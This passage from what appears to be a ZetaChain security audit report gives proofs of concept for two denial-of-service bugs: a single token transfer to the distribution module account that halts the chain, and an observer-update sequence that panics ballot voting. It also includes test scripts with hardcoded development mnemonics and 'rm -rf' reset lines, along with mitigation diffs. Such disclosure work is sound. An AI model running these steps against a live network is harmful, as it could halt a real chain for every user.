In Cosmos based blockchains there are whats called `module accounts`. During development extra care has to be taken to ensure that module accounts cannot receive any funds outside of the expected rules of the state machine. If they do this can cause invariants to be broken and result in a halted network. Do to this fact the `x/bank` module accepts a map of addresses that are considered blocklisted from directly receiving funds through arbitrary transactions.

In the ZetaChain blockchain there are many module accounts that can properly accept funds without breaking the rules of the state machine.  The vulnerability is that the  `distribution`  module account can accept funds from arbitrary users, but does so in a way that breaks the state machine.

Along with causing a total consensus failure, this bug does not allow for any new blocks to be produced which results in an inability to accept new transactions and brings the chain to a complete halt.  With regard to blockchain bugs, this is among some of the worst possible scenarios that can take place in a distribution state machine. Imagine being able to bring Ethereum to a halt by simply sending 1 wei to a certain address.

The likelihood of this being exploited in the future is high since it's simply a transfer of tokens from one account to another.

### Proof of Concept

Cosmos Documentation related to this issue located [here](https://docs.cosmos.network/v0.46/modules/bank/02\_keepers.html#common-types)

### POC

1.  Run `make install`

2.  Inside the `cmd/zetacored` folder run the command `go build`.  This will create the blockchains binary `zetacored` which you will use the interact with the blockchain while the node is running.

3.  Run the command `make init`.  I added the genesis account `tommy` to get the chain to start properly and the changes I made to `init.sh` which is run by the `make init` command are as follows:

<details>

```
#!/usr/bin/env bash

CHAINID="localnet_101-1"
KEYRING="test"
export DAEMON_HOME=$HOME/.zetacored
export DAEMON_NAME=zetacored

### chain init script for development purposes only ###
rm -rf ~/.zetacored
kill -9 $(lsof -ti:26657)
zetacored config keyring-backend $KEYRING --home ~/.zetacored
zetacored config chain-id $CHAINID --home ~/.zetacored
echo "race draft rival universe maid cheese steel logic crowd fork comic easy truth drift tomorrow eye buddy head time cash swing swift midnight borrow" | zetacored keys add zeta --algo=secp256k1 --recover --keyring-backend=$KEYRING
echo "hand inmate canvas head lunar naive increase recycle dog ecology inhale december wide bubble hockey dice worth gravity ketchup feed balance parent secret orchard" | zetacored keys add mario --algo secp256k1 --recover --keyring-backend=$KEYRING
echo "lounge supply patch festival retire duck foster decline theme horror decline poverty behind clever harsh layer primary syrup depart fantasy session fossil dismiss east" | zetacored keys add executer_zeta --recover --keyring-backend=$KEYRING --algo secp256k1
echo "debris dumb among crew celery derive judge spoon road oyster dad panic adult song attack net pole merge mystery pig actual penalty neither peasant"| zetacored keys add executer_mario --algo=secp256k1 --recover --keyring-backend=$KEYRING

zetacored init Zetanode-Localnet --chain-id=$CHAINID

#Set config to use azeta
cat $HOME/.zetacored/config/genesis.json | jq '.app_state["staking"]["params"]["bond_denom"]="azeta"' > $HOME/.zetacored/config/tmp_genesis.json && mv $HOME/.zetacored/config/tmp_genesis.json $HOME/.zetacored/config/genesis.json
cat $HOME/.zetacored/config/genesis.json | jq '.app_state["crisis"]["constant_fee"]["denom"]="azeta"' > $HOME/.zetacored/config/tmp_genesis.json && mv $HOME/.zetacored/config/tmp_genesis.json $HOME/.zetacored/config/genesis.json
cat $HOME/.zetacored/config/genesis.json | jq '.app_state["gov"]["deposit_params"]["min_deposit"][0]["denom"]="azeta"' > $HOME/.zetacored/config/tmp_genesis.json && mv $HOME/.zetacored/config/tmp_genesis.json $HOME/.zetacored/config/genesis.json
cat $HOME/.zetacored/config/genesis.json | jq '.app_state["mint"]["params"]["mint_denom"]="azeta"' > $HOME/.zetacored/config/tmp_genesis.json && mv $HOME/.zetacored/config/tmp_genesis.json $HOME/.zetacored/config/genesis.json
cat $HOME/.zetacored/config/genesis.json | jq '.app_state["evm"]["params"]["evm_denom"]="azeta"' > $HOME/.zetacored/config/tmp_genesis.json && mv $HOME/.zetacored/config/tmp_genesis.json $HOME/.zetacored/config/genesis.json
cat $HOME/.zetacored/config/genesis.json | jq '.consensus_params["block"]["max_gas"]="10000000"' > $HOME/.zetacored/config/tmp_genesis.json && mv $HOME/.zetacored/config/tmp_genesis.json $HOME/.zetacored/config/genesis.json
contents="$(jq '.app_state.gov.voting_params.voting_period = "10s"' $DAEMON_HOME/config/genesis.json)" && \
echo "${contents}" > $DAEMON_HOME/config/genesis.json
sed -i '/\[api\]/,+3 s/enable = false/enable = true/' ~/.zetacored/config/app.toml


zetacored add-observer-list standalone-network/observers.json --keygen-block=5
zetacored keys add tommy --keyring-backend test # added
zetacored add-genesis-account tommy 1000000000000000000000stake,1000000000000000000000azeta # added
zetacored gentx tommy 1000000000000000000000stake --chain-id=$CHAINID --keyring-backend=$KEYRING # added


echo "Collecting genesis txs..."
zetacored collect-gentxs

echo "Validating genesis file..."
zetacored validate-genesis
```
</details>

4.  Run `make run`. I also made the following changes ( adding the  `--inv-check-period 2`  flag) to the `run.sh` file which is run when calling the `make run` command so that all invariants can be checked every two blocks to catch the vulnerability quickly.

<details>

```

    #!/usr/bin/env bash

    CHAINID="localnet_101-1"
    KEYRING="test"
    HOSTNAME=$(hostname)
    signer="zeta"


    killall zetacored
    zetacored start --inv-check-period 2 --trace \
    --minimum-gas-prices=0.0001azeta \
    --json-rpc.api eth,txpool,personal,net,debug,web3,miner \
    --api.enable >> ~/.zetacored/zetacored.log 2>&1  & \
    #>> "$HOME"/.zetacored/zetanode.log 2>&1  & \


    #--home ~/.zetacored \
    #--p2p.laddr 0.0.0.0:27655  \
    #--grpc.address 0.0.0.0:9096 \
    #--grpc-web.address 0.0.0.0:9093 \
    #--address tcp://0.0.0.0:27659 \
    #--rpc.laddr tcp://127.0.0.1:26657 \
    #--pruning custom \
    #--pruning-keep-recent 54000 \
    #--pruning-interval 10 \
    #--min-retain-blocks 54000 \
    #--state-sync.snapshot-interval 14400 \
    #--state-sync.snapshot-keep-recent 3

    #echo "--> Submitting proposal to update admin policies "
    #sleep 7
    #zetacored tx gov submit-legacy-proposal param-change standalone-network/proposal.json --from $signer --gas=auto --gas-adjustment=1.5 --gas-prices=0.001azeta --chain-id=$CHAINID --keyring-backend=$KEYRING -y --broadcast-mode=block
    #echo "--> Submitting vote for proposal"
    #sleep 7
    #zetacored tx gov vote 1 yes --from $signer --keyring-backend $KEYRING --chain-id $CHAINID --yes --fees=40azeta --broadcast-mode=block
    tail -f ~/.zetacored/zetacored.log
```

</details>

5.  While the chain is running,  in another terminal you can query the blockchain and send transactions using the `zetacored` binary. First you can see all the module accounts by running the command `zetacored q auth accounts`.  This will contain the vulnerable `distribution` account as shown below. Make sure the address is correct for the next step. You can also verify the `zeta` account being used to send funds to the `distribution` account with the command `zetacored keys list`.

```

    '@type': /cosmos.auth.v1beta1.ModuleAccount
    base_account:
    account_number: "6"
    address: zeta1jv65s3grqf6v6jl3dp4t6c9t9rk99cd83m2fn0
    pub_key: null
    sequence: "0"
    name: distribution
    permissions: []
```

6.  Use the already included `zeta` account that has an `azeta` balance to send a transaction that sends funds from the `zeta` account to the vulnerable `distribution` account with the following command which will cause the chain to halt with a `Consensus Failure` error and also cause all blocks to stop being produced breaking the chain completely.

`zetacored tx bank send zeta13c7p3xrhd6q2rx3h235jpt8pjdwvacyw6twpax zeta1jv65s3grqf6v6jl3dp4t6c9t9rk99cd83m2fn0 100azeta --gas-prices 20azeta`

### Recommended Mitigation Steps

The way to fix this bug is by adding the `distribution` module account address to the blocklisted mapping in the bank module. This will prevent arbitrary users from sending funds directly to this address. If this address is indeed suppose to hold funds it should be done in a way that does not break the state machine or cause invariants to break.

Solution described [here](https://docs.cosmos.network/v0.46/modules/bank/02\_keepers.html#common-types).

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/176#issuecomment-1876883098)**

**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/176#issuecomment-1880157276):**
 > DOS of this nature I think should be M severity, I don't see the direct loss of funds in this instance. 

***

## [[M-34] Possible index out of range in GetVoterIndex could cause ballot to never finalize due to panic](https://github.com/code-423n4/2023-11-zetachain-findings/issues/116)
*Submitted by [dontonka](https://github.com/code-423n4/2023-11-zetachain-findings/issues/116), also found by [csanuragjain](https://github.com/code-423n4/2023-11-zetachain-findings/issues/523) and [zhaojie](https://github.com/code-423n4/2023-11-zetachain-findings/issues/214)*

The function `GetVoterIndex` is used in multiple places to get the index of a specific Observer from the Voter List. The problem is that the caller is assuming the function will always succeed, but clearly there is a possibility where the `Observer address could not be found`, which would return an `index of -1`, which will effectivelly make the program panic.

```golang
func (m Ballot) GetVoterIndex(address string) int {
	index := -1
	for i, addr := range m.VoterList {
		if addr == address {
			return i
		}
	}
	return index
}
```

### `Observer::BallotByIdentifier`

This one is safe since the GetVoterIndex is called from the same ballot instance it is iterating over, so it's impossible to not find the index in such case.

```golang
	for i, voterAddress := range ballot.VoterList {
		voter := types.VoterList{
			VoterAddress: voterAddress,
			VoteType:     ballot.Votes[ballot.GetVoterIndex(voterAddress)],
		}
		votersList[i] = &voter
	}
```

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/keeper/ballot.go#L94>

### `Observer::BuildRewardsDistribution`

Safe, for the same reason as instance 1.

```golang
		for _, address := range m.VoterList {
			vote := m.Votes[m.GetVoterIndex(address)]
```

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/types/ballot.go#L82> 

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/types/ballot.go#L92>

### `Observer::HasVoted`

Even if this is public function, it's actually a private one and only used by `AddVote`, so share the same risk.

```golang
func (m Ballot) HasVoted(address string) bool {
	index := m.GetVoterIndex(address)
	return m.Votes[index] != VoteType_NotYetVoted
}
```

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/types/ballot.go#L22>

### `Observer::AddVote`

This is the one that carries some risks. This is called by [AddVoteToBallot](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/keeper/keeper_utils.go#L12) which is then called in `6 differents places` ([VoteOnObservedInboundTx](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L95), [VoteOnObservedOutboundTx](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L105), [CreateTSSVoter 1](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/msg_tss_voter.go#L69), [CreateTSSVoter 2](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/msg_tss_voter.go#L74), [AddBlameVote](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/keeper/msg_server_add_blame_vote.go#L39) and [AddBlockHeader](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/keeper/msg_server_add_block_header.go#L79)), with the ballot instance and address being looked at coming in different parameters and from different sources, so here there is posibility the issue could occur.

```golang
func (m Ballot) AddVote(address string, vote VoteType) (Ballot, error) {
	if m.HasVoted(address) {
		return m, errors.Wrap(ErrUnableToAddVote, fmt.Sprintf(" Voter : %s | Ballot :%s | Already Voted", address, m.String()))
	}
	// `index` is the index of the `address` in the `VoterList`
	// `index` is used to set the vote in the `Votes` array
	index := m.GetVoterIndex(address)
	m.Votes[index] = vote
	return m, nil
}
```

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/types/ballot.go#L16>

### Impact

*   `zetaclientd` would panic (so crash) if the indicated code path is activated in **Instance 4**.
*   The ballot created and still in progress `might never be able to be finalized` depending on how many Observer have been updated and what is the threshold. A ballot never finalizing would mean the CCTX never reaching consensus and funds loss, which is why this seems to warrant `High` severity.

### Proof of Concept

Here is a PoC when using `AddBlockHeader`, but there might be other cracks coming from the 5 other places I identified for **Instance 4** where this code path can be activated.

1.  `AddBlockHeader` gRPC endpoint is called by Observer A. Current Observer list is A,B. Since this is the first vote, the ballot is created by `FindBallot` with observers list being A,B.
2.  Afterward, `UpdateObserver` gRPC endpoint is called to update Observer B for reason `ObserverUpdateReason_AdminUpdate`. This update Observer B address to now be C in the the `ObserverMapper` and the observer list.
3.  `AddBlockHeader` is called by Observer C (which was previously B). The ballot created previously is retrieved and `AddVoteToBallot` is called, which in turns call `ballot.AddVote(C,...)`, which in turns call `HasVoted` which will **panic** against `return m.Votes[index] != VoteType_NotYetVoted` since index will be **-1**, as C is not in the ballot Observer list.

```

    	// AddVoteToBallot adds a vote and sets the ballot
    	ballot, err = k.AddVoteToBallot(ctx, ballot, vote.Creator, types.VoteType_SuccessObservation)
    	if err != nil {
    		return nil, err
    	}
```
```

    func (m Ballot) AddVote(address string, vote VoteType) (Ballot, error) {
    	if m.HasVoted(address) {
    		return m, errors.Wrap(ErrUnableToAddVote, fmt.Sprintf(" Voter : %s | Ballot :%s | Already Voted", address, m.String()))
    	}
```
```

    func (m Ballot) HasVoted(address string) bool {
    	index := m.GetVoterIndex(address)
    	return m.Votes[index] != VoteType_NotYetVoted
    }
```

### Coded PoC

In order to demostrate my point explained before, I coded it in the following unit test. With the original code it will panic, while by adding my recommendation it will not and recover.

<details>

```

    func TestMsgServer_AddBlockHeader_Mixed_With_UpdateObserver(t *testing.T) {
    	header, _, _, err := sample.EthHeader()
    	assert.NoError(t, err)
    	header1RLP, err := rlp.EncodeToBytes(header)
    	assert.NoError(t, err)

    	observerChain := common.GoerliChain()
    	r := rand.New(rand.NewSource(9))
    	validatorA := sample.Validator(t, r)
    	validatorB := sample.Validator(t, r)
    	validatorC := sample.Validator(t, r)
    	observerAddressA, _ := types.GetAccAddressFromOperatorAddress(validatorA.OperatorAddress)
    	observerAddressB, _ := types.GetAccAddressFromOperatorAddress(validatorB.OperatorAddress)
    	observerAddressC, _ := types.GetAccAddressFromOperatorAddress(validatorC.OperatorAddress)

    	tt := []struct {
    		name                  string
    		msg                   *types.MsgAddBlockHeader
    		msg1                  *types.MsgAddBlockHeader
    		IsEthTypeChainEnabled bool
    		IsBtcTypeChainEnabled bool
    		validatorA            stakingtypes.Validator
    		validatorB            stakingtypes.Validator
    	}{
    		{
    			name: "success submit eth header",
    			msg: &types.MsgAddBlockHeader{
    				Creator:   observerAddressA.String(),
    				ChainId:   common.GoerliChain().ChainId,
    				BlockHash: header.Hash().Bytes(),
    				Height:    1,
    				Header:    common.NewEthereumHeader(header1RLP),
    			},
    			msg1: &types.MsgAddBlockHeader{
    				Creator:   observerAddressC.String(),
    				ChainId:   common.GoerliChain().ChainId,
    				BlockHash: header.Hash().Bytes(),
    				Height:    1,
    				Header:    common.NewEthereumHeader(header1RLP),
    			},
    			IsEthTypeChainEnabled: true,
    			IsBtcTypeChainEnabled: true,
    			validatorA:            validatorA,
    			validatorB:            validatorB,
    		},
    	}
    	for _, tc := range tt {
    		t.Run(tc.name, func(t *testing.T) {
    			k, ctx := keepertest.ObserverKeeper(t)
    			srv := keeper.NewMsgServerImpl(*k)
    			k.SetObserverMapper(ctx, &types.ObserverMapper{
    				ObserverChain: &observerChain,
    				ObserverList:  []string{observerAddressA.String(), observerAddressB.String()},
    			})
    			k.GetStakingKeeper().SetValidator(ctx, tc.validatorA)
    			k.GetStakingKeeper().SetValidator(ctx, tc.validatorB)

    			k.SetCrosschainFlags(ctx, types.CrosschainFlags{
    				IsInboundEnabled:      true,
    				IsOutboundEnabled:     true,
    				GasPriceIncreaseFlags: nil,
    				BlockHeaderVerificationFlags: &types.BlockHeaderVerificationFlags{
    					IsEthTypeChainEnabled: tc.IsEthTypeChainEnabled,
    					IsBtcTypeChainEnabled: tc.IsBtcTypeChainEnabled,
    				},
    			})

    			// First vote for BlockHeader with ObserverA which will create the ballot as first voter
    			// Voterlist in the ballot struct: A,B
    			_, err := srv.AddBlockHeader(ctx, tc.msg)

    			// Setup such that UpdateObserver is happy
    			admin := sample.AccAddress()
    			validatorC.Status = stakingtypes.Bonded
    			k.GetStakingKeeper().SetValidator(ctx, validatorC)
    			setAdminCrossChainFlags(ctx, k, admin, types.Policy_Type_group2)

    			k.SetNodeAccount(ctx, types.NodeAccount{
    				Operator: observerAddressB.String(),
    			})
    			k.SetLastObserverCount(ctx, &types.LastObserverCount{
    				Count: 2,
    			})

    			// Observer: B --> C
    			_, err = srv.UpdateObserver(ctx, &types.MsgUpdateObserver{
    				Creator:            admin,
    				OldObserverAddress: observerAddressB.String(),
    				NewObserverAddress: observerAddressC.String(),
    				UpdateReason:       types.ObserverUpdateReason_AdminUpdate,
    			})

    			// Second vote for BlockHeader with ObserverC, that was before ObserverB. This will panic
    			_, err = srv.AddBlockHeader(ctx, tc.msg1)
    			assert.NotNil(t, err)
    		})
    	}
    }
```
</details>

### Call stack

<details>

```
    === RUN   TestMsgServer_AddBlockHeader_Mixed_With_UpdateObserver
    --- FAIL: TestMsgServer_AddBlockHeader_Mixed_With_UpdateObserver (0.56s)
    === RUN   TestMsgServer_AddBlockHeader_Mixed_With_UpdateObserver/success_submit_eth_header
        --- FAIL: TestMsgServer_AddBlockHeader_Mixed_With_UpdateObserver/success_submit_eth_header (0.02s)
    panic: runtime error: index out of range [-1] [recovered]
    	panic: runtime error: index out of range [-1]

    goroutine 98 [running]:
    testing.tRunner.func1.2({0x168aea0, 0xc0006a6c00})
    	/usr/local/go/src/testing/testing.go:1526 +0x24e
    testing.tRunner.func1()
    	/usr/local/go/src/testing/testing.go:1529 +0x39f
    panic({0x168aea0, 0xc0006a6c00})
    	/usr/local/go/src/runtime/panic.go:884 +0x213
    github.com/zeta-chain/zetacore/x/observer/types.Ballot.HasVoted(...)
    	/mnt/c/IX/GitProjects/platform-tools/ETH_course/C4/2023-11-zetachain/repos/node/x/observer/types/ballot.go:28
    github.com/zeta-chain/zetacore/x/observer/types.Ballot.AddVote({{0xc00025d8b0, 0x42}, {0xc00025d900, 0x42}, {0xc0013d36a0, 0x2, 0x2}, {0xc0013022e0, 0x2, 0x2}, ...}, ...)
    	/mnt/c/IX/GitProjects/platform-tools/ETH_course/C4/2023-11-zetachain/repos/node/x/observer/types/ballot.go:11 +0x4b9
    github.com/zeta-chain/zetacore/x/observer/keeper.Keeper.AddVoteToBallot({{0x1bd0ac0, 0xc000c9e410}, {0x1bb7050, 0xc000d51540}, {0x1bb7078, 0xc000d51550}, {{0x1bd0ac0, 0xc000c9e410}, 0xc000014b50, {0x1bb7050, ...}, ...}, ...}, ...)
    	/mnt/c/IX/GitProjects/platform-tools/ETH_course/C4/2023-11-zetachain/repos/node/x/observer/keeper/keeper_utils.go:13 +0x10f
    github.com/zeta-chain/zetacore/x/observer/keeper.msgServer.AddBlockHeader({{{0x1bd0ac0, 0xc000c9e410}, {0x1bb7050, 0xc000d51540}, {0x1bb7078, 0xc000d51550}, {{0x1bd0ac0, 0xc000c9e410}, 0xc000014b50, {0x1bb7050, ...}, ...}, ...}}, ...)
    	/mnt/c/IX/GitProjects/platform-tools/ETH_course/C4/2023-11-zetachain/repos/node/x/observer/keeper/msg_server_add_block_header.go:79 +0x906
    github.com/zeta-chain/zetacore/x/observer/keeper_test.TestMsgServer_AddBlockHeader_Mixed_With_UpdateObserver.func1(0xc0010104e0?)
    	/mnt/c/IX/GitProjects/platform-tools/ETH_course/C4/2023-11-zetachain/repos/node/x/observer/keeper/msg_server_add_block_header_test.go:267 +0xd48
    testing.tRunner(0xc0010104e0, 0xc00066e000)
    	/usr/local/go/src/testing/testing.go:1576 +0x10b
    created by testing.(*T).Run
    	/usr/local/go/src/testing/testing.go:1629 +0x3ea


    Process finished with the exit code 1
```

</details>

### Recommended Mitigation Steps

The probability of the indicated negative impacts happening as soon as `UpdateObserver` is pretty high depending on the blockchain activity (and ballot currently in progress), but calling `UpdateObserver` should not happen often and can only be triggered by the `Admins Group2` (multi-sig).

Granted that the scenario exposed in my PoC might be rare, I haven't taken the time to investigate all the other coner cases where this code path can be activated, which raise doubts on the frequency such scenario can happen which is another reason why it should be mitigated.

I would recommend todo the following changes in order to fix the panic in `HasVoted` and `AddVote` at least which seems to present some risks. That will not resolve the issue that impacted ballot might never been able to finalize. A way to mitigate this would be to update also the ballot when updating the observer address.

```diff
diff --git a/repos/node/x/observer/types/ballot.go b/repos/node/x/observer/types/ballot.go
index dae3476..1e44221 100644
--- a/repos/node/x/observer/types/ballot.go
+++ b/repos/node/x/observer/types/ballot.go
@@ -14,13 +14,20 @@ func (m Ballot) AddVote(address string, vote VoteType) (Ballot, error) {
        // `index` is the index of the `address` in the `VoterList`
        // `index` is used to set the vote in the `Votes` array
        index := m.GetVoterIndex(address)
-       m.Votes[index] = vote
-       return m, nil
+       if index != -1 {
+               m.Votes[index] = vote
+               return m, nil
+       }
+
+       return m, errors.Wrap(ErrUnableToAddVote, fmt.Sprintf(" Voter : %s | Ballot :%s | Not found!", address, m.String()))
 }

 func (m Ballot) HasVoted(address string) bool {
        index := m.GetVoterIndex(address)
-       return m.Votes[index] != VoteType_NotYetVoted
+       if index != -1 {
+               return m.Votes[index] != VoteType_NotYetVoted
+       }
+       return false
 }
```

**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/116#issuecomment-1896325887):**
 > @lumtis - I don't see proof that this leads to a loss of user funds if CCTXs are paused, can you explain to me how that occurs which is needed for this to be considered as H severity?  

**[lumtis (ZetaChain) confirmed and commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/116#issuecomment-1903301334):**
> Yes, I confirmed this is an issue that need to be fixed but on the severity I agree to decrease to med risk

***

# Low Risk and Non-Critical Issues

For this audit, 20 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-11-zetachain-findings/issues/164) by **dontonka** received the top score from the judge.

*The following wardens also submitted reports: [IllIllI](https://github.com/code-423n4/2023-11-zetachain-findings/issues/579), [MevSec](https://github.com/code-423n4/2023-11-zetachain-findings/issues/569), [0x6980](https://github.com/code-423n4/2023-11-zetachain-findings/issues/554), [PNS](https://github.com/code-423n4/2023-11-zetachain-findings/issues/526), [ciphermarco](https://github.com/code-423n4/2023-11-zetachain-findings/issues/515), [Al-Qa-qa](https://github.com/code-423n4/2023-11-zetachain-findings/issues/421), [ChaseTheLight](https://github.com/code-423n4/2023-11-zetachain-findings/issues/355), [hihen](https://github.com/code-423n4/2023-11-zetachain-findings/issues/320), [oakcobalt](https://github.com/code-423n4/2023-11-zetachain-findings/issues/516), [SAQ](https://github.com/code-423n4/2023-11-zetachain-findings/issues/512), [QiuhaoLi](https://github.com/code-423n4/2023-11-zetachain-findings/issues/488), [codeslide](https://github.com/code-423n4/2023-11-zetachain-findings/issues/445), [lsaudit](https://github.com/code-423n4/2023-11-zetachain-findings/issues/443), [Bauchibred](https://github.com/code-423n4/2023-11-zetachain-findings/issues/374), [Kaysoft](https://github.com/code-423n4/2023-11-zetachain-findings/issues/365), [Topmark](https://github.com/code-423n4/2023-11-zetachain-findings/issues/267), [cartlex\_](https://github.com/code-423n4/2023-11-zetachain-findings/issues/204), [p0wd3r](https://github.com/code-423n4/2023-11-zetachain-findings/issues/182), and [Sathish9098](https://github.com/code-423n4/2023-11-zetachain-findings/issues/79).*

## [01] `evm_signer::TryProcessOutTx` `err` variable doesn't need to be declared 
`evm_signer::TryProcessOutTx` `err` variable doesn't need to be declared [here](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_signer.go#L330), as it will be created [here](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_signer.go#L357) and is not used before that. So the [following code](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_signer.go#L351-L354) is also useless. So I suggest to remove those.

<details>

```diff
	var to ethcommon.Address
-	var err error
	var toChain *common.Chain
	if send.CctxStatus.Status == types.CctxStatus_PendingRevert {
		to = ethcommon.HexToAddress(send.InboundTxParams.Sender)
		toChain = common.GetChainFromChainID(send.InboundTxParams.SenderChainId)
		if toChain == nil {
			logger.Error().Msgf("Unknown chain: %d", send.InboundTxParams.SenderChainId)
			return
		}
		logger.Info().Msgf("Abort: reverting inbound")
	} else if send.CctxStatus.Status == types.CctxStatus_PendingOutbound {
		to = ethcommon.HexToAddress(send.GetCurrentOutTxParam().Receiver)
		toChain = common.GetChainFromChainID(send.GetCurrentOutTxParam().ReceiverChainId)
		if toChain == nil {
			logger.Error().Msgf("Unknown chain: %d", send.GetCurrentOutTxParam().ReceiverChainId)
			return
		}
	} else {
		logger.Info().Msgf("Transaction doesn't need to be processed status: %d", send.CctxStatus.Status)
		return
	}
-	if err != nil {
-		logger.Error().Err(err).Msg("ParseChain fail; skip")
-		return
-	}

	// Early return if the cctx is already processed
	included, confirmed, err := evmClient.IsSendOutTxProcessed(send.Index, send.GetCurrentOutTxParam().OutboundTxTssNonce, send.GetCurrentOutTxParam().CoinType, logger)
	if err != nil {
		logger.Error().Err(err).Msg("IsSendOutTxProcessed failed")
	}
```
</details>

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_signer.go#L351-L354

## [02] `evm_signer::TryProcessOutTx` does allow to send out CCTX tx to address(0)

`evm_signer::TryProcessOutTx` does allow to send out CCTX tx to address(0), which would effectivelly cause a funds loss. This is low as self-reck. I would recommend to add the following conditions.

<details>

```diff
	if send.CctxStatus.Status == types.CctxStatus_PendingRevert {
		to = ethcommon.HexToAddress(send.InboundTxParams.Sender)
		toChain = common.GetChainFromChainID(send.InboundTxParams.SenderChainId)
		if toChain == nil {
			logger.Error().Msgf("Unknown chain: %d", send.InboundTxParams.SenderChainId)
			return
		}
+		if to == (ethcommon.Address{}) {
+			logger.Error().Msgf("Invalid receiver %s", send.InboundTxParams.Sender)
+			return
+		}
		logger.Info().Msgf("Abort: reverting inbound")
	} else if send.CctxStatus.Status == types.CctxStatus_PendingOutbound {
		to = ethcommon.HexToAddress(send.GetCurrentOutTxParam().Receiver)
		toChain = common.GetChainFromChainID(send.GetCurrentOutTxParam().ReceiverChainId)
		if toChain == nil {
			logger.Error().Msgf("Unknown chain: %d", send.GetCurrentOutTxParam().ReceiverChainId)
			return
		}
+		if to == (ethcommon.Address{}) {
+			logger.Error().Msgf("Invalid receiver %s", send.GetCurrentOutTxParam().Receiver)
+			return
+		}
	} else {
		logger.Info().Msgf("Transaction doesn't need to be processed status: %d", send.CctxStatus.Status)
		return
	}
```
</details>

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_signer.go#L332-L349

## [03] `SystemContract.sol` could have some minor refactor introducing a `modifier`

`SystemContract.sol` could have some minor refactor introducing a `modifier` as follow to aliviate and make the code cleaner, and use it on all the `external` functions and the contructor as they are all gated with the `same condition` below.
```diff
+    /**
+     * @dev Only Fungible address allowed modifier.
+     */
+     modifier onlyFungibble() {
+        if (msg.sender != FUNGIBLE_MODULE_ADDRESS) revert CallerIsNotFungibleModule();
+        _;
+    }
```

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/protocol-contracts/contracts/zevm/SystemContract.sol#L51

## [04] `ERC20Custody.sol` has the following useless code in `pause` function

`ERC20Custody.sol` has the following useless code in `pause` function which I suggest to remove. Since the function is guarded by `onlyTSS` the modifier, which ensure `msg.sender == TSSAddress` before going even further into the function, this means `TSSAddress` can never be `address(0)`, which make this code totally useless. 
```diff
    function pause() external onlyTSS {
        if (paused) {
            revert IsPaused();
        }
-       if (TSSAddress == address(0)) {
-           revert ZeroAddress();
-       }
        paused = true;
        emit Paused(msg.sender);
    }
```

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/protocol-contracts/contracts/evm/ERC20Custody.sol#L122-L124

## [05] `ERC20Custody.sol` has a `divergence` in the implementation regarding fees

`ERC20Custody.sol` has a `divergence` in the implementation regarding fees, consider the following:
- `zeta` which represent the Zeta token contract on the chain is `immutable`, so can't be changed after contract contruction.
- `zetaFee` is not immutable and can be updated at any point in time by `updateZetaFee`.

The `deposit` function along with the `constructor` are causing this divergence, as constructor allow zeta to be address(0) at construction, which deposit account for in the following code, but then if `zetaFee` are modified later on (Zeta wants to start charging fees on ERC20 deposits), those fees will never be able to be charged in case zeta was passed as address(0) at constrution.

So I would recommend the following changes to mitigate this. While we are here, I would also suggest to add a validation for `zetaMaxFee` in the constructor since it's immutable too.

<details>

```diff
    constructor(address TSSAddress_, address TSSAddressUpdater_, uint256 zetaFee_, uint256 zetaMaxFee_, IERC20 zeta_) {
        TSSAddress = TSSAddress_;
        TSSAddressUpdater = TSSAddressUpdater_;
        zetaFee = zetaFee_;
+       if (zeta == address(0)) revert ZeroAddress();
        zeta = zeta_;
        zetaMaxFee = zetaMaxFee_;
    }

    function deposit(
        bytes calldata recipient,
        IERC20 asset,
        uint256 amount,
        bytes calldata message
    ) external nonReentrant {
        if (paused) {
            revert IsPaused();
        }
        if (!whitelisted[asset]) {
            revert NotWhitelisted();
        }
-       if (zetaFee != 0 && address(zeta) != address(0)) {
+       if (zetaFee != 0) {
            zeta.safeTransferFrom(msg.sender, TSSAddress, zetaFee);
        }
        uint256 oldBalance = asset.balanceOf(address(this));
        asset.safeTransferFrom(msg.sender, address(this), amount);
        // In case if there is a fee on a token transfer, we might not receive a full exepected amount
        // and we need to correctly process that, o we subtract an old balance from a new balance, which should be an actual received amount.
        emit Deposited(recipient, asset, asset.balanceOf(address(this)) - oldBalance, message);
    }
```

</details>

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/protocol-contracts/contracts/evm/ERC20Custody.sol#L177

## [06] `evm_signer` is hardcoding the `gaslimit` at `21000` in multiples places

`evm_signer` is hardcoding the `gaslimit` at `21000` in multiples places (see links below). We have seen in previous EVM forks changing the gas cost of some key opcode, for example the SSTORE opcode. This can happen again in the future and if it does happen that this hardcoded gas limit is not enought anymore for the target chain, it will lead to CCTX not working as expected and failures on the network. Finally, since this value need to be working for all the EVM-supported chain, the gas costs can be different to a level that this hardcoded value will not satisfy all the chains.

I would recommend to fetch this value at least from a configuration file, and have it per EVM chain, such that it is flexible enought to adapt to the future not requiring to recompile a new binary.

